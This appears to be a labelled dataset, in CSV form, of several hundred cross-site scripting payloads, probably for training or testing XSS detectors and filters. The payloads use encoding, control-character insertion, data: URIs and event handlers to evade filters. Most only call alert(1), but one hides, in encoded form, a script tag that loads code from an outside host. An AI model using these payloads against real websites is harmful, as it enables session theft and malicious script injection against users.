,payload,type
8078,<script x> alert(1) </script 1=2,xss
8079,"<div/onmouseover='alert(1)'> style=""x:"">",xss
8080,<--`<img/src=` onerror=alert(1)> --!>,xss
8081,"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
8082,"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",xss
8083,"""><img src=x onerror=window.open('https://www.google.com/');>",xss
8084,<form><button formaction=javascript&colon;alert(1)>CLICKME,xss
8085,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
8086,"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
8087,"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
8088,"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",xss
8089,"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
8090,"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
8091,"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
8092,"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
8093,"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
8094,"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
8095,"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
8096,"'`""><\x3Cscript>javascript:alert(1)</script>",xss
8097,"'`""><\x00script>javascript:alert(1)</script>",xss
8098,"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss
8099,"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",xss
8100,"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",xss
8101,"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",xss
8102,"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",xss
8103,"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",xss
8104,"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",xss
8105,"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",xss
8106,"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",xss
8107,"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",xss
8108,"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",xss
8109,"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",xss
8110,"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",xss
8111,"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",xss
8112,"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",xss
8113,"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",xss
8114,"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss
8115,"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",xss
8116,"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss
8117,"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",xss
8118,"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",xss
8119,"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",xss
8120,"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",xss
8121,"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",xss
8122,"<style onLoad style onLoad=""javascript:javascript:alert(1)""></style onLoad>",xss
8123,"<iframe onReadyStateChange iframe onReadyStateChange=""javascript:javascript:alert(1)""></iframe onReadyStateChange>",xss
8124,"<body onPageShow body onPageShow=""javascript:javascript:alert(1)""></body onPageShow>",xss
8125,"<style onReadyStateChange style onReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",xss
8126,"<frameset onFocus frameset onFocus=""javascript:javascript:alert(1)""></frameset onFocus>",xss
8127,"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",xss
8128,"<marquee onStart marquee onStart=""javascript:javascript:alert(1)""></marquee onStart>",xss
8129,"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",xss
8130,"<html onMouseOver html onMouseOver=""javascript:javascript:alert(1)""></html onMouseOver>",xss
8131,"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>",xss
8132,"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss
8133,"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",xss
8134,"<marquee onScroll marquee onScroll=""javascript:javascript:alert(1)""></marquee onScroll>",xss
8135,"<xml onPropertyChange xml onPropertyChange=""javascript:javascript:alert(1)""></xml onPropertyChange>",xss
8136,"<frameset onBlur frameset onBlur=""javascript:javascript:alert(1)""></frameset onBlur>",xss
8137,"<applet onReadyStateChange applet onReadyStateChange=""javascript:javascript:alert(1)""></applet onReadyStateChange>",xss
8138,"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",xss
8139,"<html onMouseOut html onMouseOut=""javascript:javascript:alert(1)""></html onMouseOut>",xss
8140,"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",xss
8141,"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",xss
8142,"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",xss
8143,"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
8144,"<html onMouseMove html onMouseMove=""javascript:javascript:alert(1)""></html onMouseMove>",xss
8145,"<applet onreadystatechange applet onreadystatechange=""javascript:javascript:alert(1)""></applet onreadystatechange>",xss
8146,"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",xss
8147,"<svg onunload svg onunload=""javascript:javascript:alert(1)""></svg onunload>",xss
8148,"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",xss
8149,"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>",xss
8150,"<body onunload body onunload=""javascript:javascript:alert(1)""></body onunload>",xss
8151,"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",xss
8152,"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",xss
8153,"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",xss
8154,"<object onbeforeload object onbeforeload=""javascript:javascript:alert(1)""></object onbeforeload>",xss
8155,"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
8156,"<body onfocus body onfocus=""javascript:javascript:alert(1)""></body onfocus>",xss
8157,"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",xss
8158,"<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1)""></iframe onbeforeload>",xss
8159,"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",xss
8160,"<svg onload svg onload=""javascript:javascript:alert(1)""></svg onload>",xss
8161,"<html onmousemove html onmousemove=""javascript:javascript:alert(1)""></html onmousemove>",xss
8162,"<body onblur body onblur=""javascript:javascript:alert(1)""></body onblur>",xss
8163,\x3Cscript>javascript:alert(1)</script>,xss
8164,"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",xss
8165,<script>javascript:alert(1)</script\x0D,xss
8166,<script>javascript:alert(1)</script\x0A,xss
8167,<script>javascript:alert(1)</script\x0B,xss
8168,"<script charset=""\x22>javascript:alert(1)</script>",xss
8169,<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,xss
8170,--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
8171,--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
8172,--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
8173,--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->,xss
8174,"`""'><img src='#\x27 onerror=javascript:alert(1)>",xss
8175,"<a href=""javascript\x3Ajavascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8176,"""'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",xss
8177,"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8178,"<a href=""javas\x07cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8179,"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8180,"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8181,"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8182,"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8183,"<a href=""javas\x03cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8184,"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8185,"<a href=""javas\x01cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8186,"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8187,"<a href=""javas\x0Bcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8188,"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8189,"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8190,"<a href=""javas\x0Ccript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8191,<script>/* *\x2A/javascript:alert(1)// */</script>,xss
8192,<script>/* *\x00/javascript:alert(1)// */</script>,xss
8193,"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
8194,"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
8195,"<style></style\x09<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
8196,"<style></style\x20<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
8197,"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
8198,"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF",xss
8199,"""'`>ABC<div style=""font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"">DEF",xss
8200,"<script>if(""x\\xE1\x96\x89"".length==2) { javascript:alert(1);}</script>",xss
8201,"<script>if(""x\\xE0\xB9\x92"".length==2) { javascript:alert(1);}</script>",xss
8202,"<script>if(""x\\xEE\xA9\x93"".length==2) { javascript:alert(1);}</script>",xss
8203,"'`""><\x3Cscript>javascript:alert(1)</script>",xss
8204,"'`""><\x00script>javascript:alert(1)</script>",xss
8205,"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>",xss
8206,"""'`><\x00img src=xxx:x onerror=javascript:alert(1)>",xss
8207,"<script src=""data:text/plain\x2Cjavascript:alert(1)""></script>",xss
8208,"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",xss
8209,"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",xss
8210,"<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",xss
8211,"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
8212,"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss
8213,"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
8214,"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
8215,"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss
8216,"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss
8217,"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
8218,"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",xss
8219,"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",xss
8220,"ABC<div style=""x:expression\x00(javascript:alert(1)"">DEF",xss
8221,"ABC<div style=""x:exp\x00ression(javascript:alert(1)"">DEF",xss
8222,"ABC<div style=""x:exp\x5Cression(javascript:alert(1)"">DEF",xss
8223,"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",xss
8224,"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",xss
8225,"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(1)"">DEF",xss
8226,"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",xss
8227,"ABC<div style=""x:\xC2\xA0expression(javascript:alert(1)"">DEF",xss
8228,"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",xss
8229,"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",xss
8230,"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",xss
8231,"ABC<div style=""x:\x0Cexpression(javascript:alert(1)"">DEF",xss
8232,"ABC<div style=""x:\xE2\x80\x87expression(javascript:alert(1)"">DEF",xss
8233,"ABC<div style=""x:\xEF\xBB\xBFexpression(javascript:alert(1)"">DEF",xss
8234,"ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF",xss
8235,"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(1)"">DEF",xss
8236,"ABC<div style=""x:\x00expression(javascript:alert(1)"">DEF",xss
8237,"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF",xss
8238,"ABC<div style=""x:\xE2\x80\x86expression(javascript:alert(1)"">DEF",xss
8239,"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",xss
8240,"ABC<div style=""x:\xE2\x80\x82expression(javascript:alert(1)"">DEF",xss
8241,"ABC<div style=""x:\x0Bexpression(javascript:alert(1)"">DEF",xss
8242,"ABC<div style=""x:\xE2\x80\x81expression(javascript:alert(1)"">DEF",xss
8243,"ABC<div style=""x:\xE2\x80\x83expression(javascript:alert(1)"">DEF",xss
8244,"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",xss
8245,"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8246,"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8247,"<a href=""\xC2\xA0javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8248,"<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8249,"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8250,"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8251,"<a href=""\x11javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8252,"<a href=""\xE2\x80\x88javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8253,"<a href=""\xE2\x80\x89javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8254,"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8255,"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8256,"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8257,"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8258,"<a href=""\x1Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8259,"<a href=""\x00javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8260,"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8261,"<a href=""\xE2\x80\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8262,"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8263,"<a href=""\x13javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8264,"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8265,"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8266,"<a href=""\x14javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8267,"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8268,"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8269,"<a href=""\x1Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8270,"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8271,"<a href=""\x1Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8272,"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8273,"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8274,"<a href=""\xE1\x9A\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8275,"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8276,"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8277,"<a href=""\x01javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8278,"<a href=""\x08javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8279,"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8280,"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8281,"<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8282,"<a href=""\x12javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8283,"<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8284,"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8285,"<a href=""\x0Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8286,"<a href=""\x15javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8287,"<a href=""\xE2\x80\xA8javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8288,"<a href=""\x16javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8289,"<a href=""\x02javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8290,"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8291,"<a href=""\x06javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8292,"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8293,"<a href=""\xE2\x80\x85javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8294,"<a href=""\x1Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8295,"<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8296,"<a href=""\x1Cjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8297,"<a href=""javascript\x00:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8298,"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8299,"<a href=""javascript\x09:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8300,"<a href=""javascript\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8301,"<a href=""javascript\x0A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
8302,"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",xss
8303,"`""'><img src=xxx:x \x22onerror=javascript:alert(1)>",xss
8304,"`""'><img src=xxx:x \x0Bonerror=javascript:alert(1)>",xss
8305,"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",xss
8306,"`""'><img src=xxx:x \x2Fonerror=javascript:alert(1)>",xss
8307,"`""'><img src=xxx:x \x09onerror=javascript:alert(1)>",xss
8308,"`""'><img src=xxx:x \x0Conerror=javascript:alert(1)>",xss
8309,"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",xss
8310,"`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",xss
8311,"`""'><img src=xxx:x \x20onerror=javascript:alert(1)>",xss
8312,"""`'><script>\x3Bjavascript:alert(1)</script>",xss
8313,"""`'><script>\x0Djavascript:alert(1)</script>",xss
8314,"""`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>",xss
8315,"""`'><script>\xE2\x80\x81javascript:alert(1)</script>",xss
8316,"""`'><script>\xE2\x80\x84javascript:alert(1)</script>",xss
8317,"""`'><script>\xE3\x80\x80javascript:alert(1)</script>",xss
8318,"""`'><script>\x09javascript:alert(1)</script>",xss
8319,"""`'><script>\xE2\x80\x89javascript:alert(1)</script>",xss
8320,"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",xss
8321,"""`'><script>\xE2\x80\x88javascript:alert(1)</script>",xss
8322,"""`'><script>\x00javascript:alert(1)</script>",xss
8323,"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",xss
8324,"""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",xss
8325,"""`'><script>\xE1\x9A\x80javascript:alert(1)</script>",xss
8326,"""`'><script>\x0Cjavascript:alert(1)</script>",xss
8327,"""`'><script>\x2Bjavascript:alert(1)</script>",xss
8328,"""`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>",xss
8329,"""`'><script>-javascript:alert(1)</script>",xss
8330,"""`'><script>\x0Ajavascript:alert(1)</script>",xss
8331,"""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",xss
8332,"""`'><script>\x7Ejavascript:alert(1)</script>",xss
8333,"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",xss
8334,"""`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>",xss
8335,"""`'><script>\xE2\x80\xA9javascript:alert(1)</script>",xss
8336,"""`'><script>\xC2\x85javascript:alert(1)</script>",xss
8337,"""`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>",xss
8338,"""`'><script>\xE2\x80\x83javascript:alert(1)</script>",xss
8339,"""`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",xss
8340,"""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",xss
8341,"""`'><script>\xE2\x80\x80javascript:alert(1)</script>",xss
8342,"""`'><script>\x21javascript:alert(1)</script>",xss
8343,"""`'><script>\xE2\x80\x82javascript:alert(1)</script>",xss
8344,"""`'><script>\xE2\x80\x86javascript:alert(1)</script>",xss
8345,"""`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>",xss
8346,"""`'><script>\x0Bjavascript:alert(1)</script>",xss
8347,"""`'><script>\x20javascript:alert(1)</script>",xss
8348,"""`'><script>\xC2\xA0javascript:alert(1)</script>",xss
8349,"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
8350,"""/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />",xss
8351,"""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",xss
8352,"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss
8353,"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
8354,"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",xss
8355,"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",xss
8356,"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss
8357,"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",xss
8358,<script\x2F>javascript:alert(1)</script>,xss
8359,<script\x20>javascript:alert(1)</script>,xss
8360,<script\x0D>javascript:alert(1)</script>,xss
8361,<script\x0A>javascript:alert(1)</script>,xss
8362,<script\x0C>javascript:alert(1)</script>,xss
8363,<script\x00>javascript:alert(1)</script>,xss
8364,<script\x09>javascript:alert(1)</script>,xss
8365,"""><img src=x onerror=javascript:alert(1)>",xss
8366,"""><img src=x onerror=javascript:alert('1')>",xss
8367,"""><img src=x onerror=javascript:alert(""1"")>",xss
8368,"""><img src=x onerror=javascript:alert(`1`)>",xss
8369,"""><img src=x onerror=javascript:alert(('1'))>",xss
8370,"""><img src=x onerror=javascript:alert((""1""))>",xss
8371,"""><img src=x onerror=javascript:alert((`1`))>",xss
8372,"""><img src=x onerror=javascript:alert(A)>",xss
8373,"""><img src=x onerror=javascript:alert((A))>",xss
8374,"""><img src=x onerror=javascript:alert(('A'))>",xss
8375,"""><img src=x onerror=javascript:alert('A')>",xss
8376,"""><img src=x onerror=javascript:alert((""A""))>",xss
8377,"""><img src=x onerror=javascript:alert(""A"")>",xss
8378,"""><img src=x onerror=javascript:alert((`A`))>",xss
8379,"""><img src=x onerror=javascript:alert(`A`)>",xss
8380,"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",xss
8381,"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",xss
8382,"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",xss
8383,"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",xss
8384,"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",xss
8385,"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
8386,"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",xss
8387,<script>javascript:alert(1)<\x00/script>,xss
8388,"<img src=# onerror\x3D""javascript:alert(1)"" >",xss
8389,<input onfocus=javascript:alert(1) autofocus>,xss
8390,<input onblur=javascript:alert(1) autofocus><input autofocus>,xss
8391,<video poster=javascript:javascript:alert(1)//,xss
8392,<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss
8393,<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,xss
8394,"<video><source onerror=""javascript:javascript:alert(1)"">",xss
8395,"<video onerror=""javascript:javascript:alert(1)""><source>",xss
8396,"<form><button formaction=""javascript:javascript:alert(1)"">X",xss
8397,<body oninput=javascript:alert(1)><input autofocus>,xss
8398,"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
8399,<frameset onload=javascript:alert(1)>,xss
8400,"<table background=""javascript:javascript:alert(1)"">",xss
8401,"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss
8402,"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
8403,"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",xss
8404,"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss
